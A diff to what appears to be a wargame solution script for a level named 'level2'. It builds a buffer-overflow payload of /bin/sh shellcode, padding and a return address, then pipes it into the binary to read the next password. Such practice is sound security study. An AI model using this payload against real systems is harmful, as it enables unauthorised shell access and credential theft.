@@ -8,9 +8,9 @@ SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\
 PADDING=`python -c 'print("A" * 52)'` # OFFSET=80 - SHELLCODE_LENGTH=28
 RETADDRESS="\x08\xa0\x04\x08"
 
-echo -e "${SHELLCODE}${PADDING}${RETADDRESS}" > /tmp/exploit
+python -c "print('$SHELLCODE' + '$PADDING' + '$RETADDRESS')" > /tmp/exploit2
 
-(cat /tmp/exploit - | ~/level2) << EOI
+(cat /tmp/exploit2 - | ~/level2) << EOI
     echo "\nid: \$(id)"
     echo "Next pass is:  \$($GETPASS)\n"
 EOI
